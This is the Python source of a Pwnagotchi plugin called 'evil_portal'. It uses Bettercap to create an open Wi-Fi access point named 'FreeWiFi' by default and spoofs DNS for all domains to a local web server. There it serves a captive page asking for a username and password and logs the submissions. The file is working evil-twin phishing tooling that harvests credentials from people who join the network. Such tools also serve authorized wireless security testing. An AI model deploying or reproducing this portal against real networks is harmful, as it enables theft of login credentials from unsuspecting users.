
from pwnagotchi.plugins import Plugin
import os
import subprocess
import signal
import logging

# this is experimental and not stable

class evil_portal(Plugin):
    __author__ = "avipars"
    __version__ = "0.0.4.1"
    __license__ = "GPL3"
    __name__ = "evil_portal"
    __github__ = "https://github.com/sponsors/avipars"
    __description__ = "Uses Bettercap to create open AP and captive portal with logging."

    def __init__(self):
        self.mode = 'MANU' 
        self.process = None
        self.caplet_path = "/root/captive.cap"
        self.portal_folder = "/root/captive_portal/"
        self.portal_log = "/root/portal_logs.txt"

    def on_loaded(self):
        logging.info("evil_portal loaded with options: %s", repr(self.options))
        # Check that Bettercap is installed and working before anything else.
        if not self.check_bettercap():
            logging.error("[evil_portal] Bettercap is not installed or not working. Aborting initialization.")
            return

    def on_config_changed(self, config):
        logging.info("evil_portal config change. %s" % repr(self.options))

    def on_ready(self, agent):
            ssid = self.options.get('ssid', 'FreeWiFi')
            channel = self.options.get('channel', 6)

            self._generate_caplet(ssid, channel)

            # Ensure portal folder exists
            os.makedirs(self.portal_folder, exist_ok=True)

            # Create a default index.html if none exists
            index_html = os.path.join(self.portal_folder, "index.html")
            if not os.path.exists(index_html):
                with open(index_html, "w") as f:
                    f.write("""
                    <html><body>
                    <h1>Free WiFi Access</h1>
                    <form method='POST'>
                        Username: <input name='user'><br>
                        Password: <input name='pass'><br>
                        <input type='submit'>
                    </form>
                    </body></html>
                    """)

            # Start bettercap
            self._log("Starting Bettercap captive portal...")
            self.process = subprocess.Popen(["bettercap", "-caplet", self.caplet_path])

    def on_unload(self, ui):
        self._log("Stopping captive portal...")
        if self.process:
            self.process.terminate()  # Send SIGTERM
            try:
                self.process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._log("Bettercap did not terminate gracefully, killing...")
                self.process.kill()
            self.process = None
        self._log("unloaded.")

    def _log(self, message):
        logging.info(f"[evil_portal] {message}")

        # print(f"[evil_portal] {message}")
        # with open(self.portal_log, "a") as f:
        #     f.write(message + "\n")

    def _generate_caplet(self, ssid, channel):
        caplet_content = f"""
set wifi.ap.ssid "{ssid}"
set wifi.ap.channel {channel}
set wifi.ap.open true
wifi.recon on
wifi.ap.start

set http.server.address 0.0.0.0
set http.server.port 80
set http.server.path {self.portal_folder}
set http.server.log {self.portal_log}
http.server on

set dns.spoof.domains *
set dns.spoof.address 10.0.0.1
dns.spoof on
"""
        with open(self.caplet_path, "w") as f:
            f.write(caplet_content)
        self._log(f"Caplet generated at {self.caplet_path}")

    def check_bettercap(self):
        """Checks if Bettercap is installed and working by running 'bettercap --version'."""
        try:
            result = subprocess.run(["bettercap", "--version"], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                self._log("Bettercap is installed and working: " + result.stdout.strip())
                return True
            else:
                self._log("Bettercap returned an error: " + result.stderr.strip())
        except Exception as e:
            self._log(f"Error checking Bettercap: {e}")
        return False